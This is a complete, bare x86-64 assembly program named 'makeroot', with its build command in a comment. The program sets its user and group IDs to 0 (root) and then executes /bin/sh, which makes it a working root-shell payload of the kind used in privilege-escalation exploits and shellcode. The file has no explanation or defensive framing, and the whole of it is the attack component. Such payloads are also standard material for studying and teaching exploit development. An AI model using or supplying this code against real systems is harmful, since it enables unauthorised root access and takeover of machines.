; nasm -f elf64 makeroot.asm -o makeroot.o && ld -m elf_x86_64 makeroot.o -o makeroot

global _start

section .text
_start:
	sub rsp, 0x18
	mov rax, 0x68732f6e69622f  ; /bin/sh
	mov qword [rsp], rax
	mov qword [rsp+0x8], rsp
	mov qword [rsp+0x10], 0x0
	
	mov rax, 0x69  ; SYS_setuid
	mov rdi, 0
	syscall

	mov rax, 0x6a  ; SYS_setgid
	mov rdi, 0
	syscall

	mov rax, 0x3b  ; SYS_execve
	lea rdi, [rsp]
	lea rsi, [rsp+0x8]
	lea rdx, [rsp+0x10]
	syscall
	
	mov rax, 0x3c  ; SYS_exit
	mov rdi, 42
	syscall
